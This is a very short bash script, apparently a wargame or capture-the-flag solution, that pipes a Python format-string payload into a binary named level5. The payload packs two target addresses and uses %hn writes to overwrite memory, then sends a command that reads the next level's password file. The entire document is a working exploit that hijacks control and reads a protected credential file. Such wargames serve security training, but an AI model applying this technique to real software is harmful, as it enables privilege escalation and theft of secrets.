#!/bin/bash

(python -c 'import struct; print struct.pack("I", 0x8049838) + struct.pack("I", 0x804983a) + "%2044u%5$hn" + "%31904u%4$hn"'; echo "cat /home/user/level6/.pass") | ~/level5
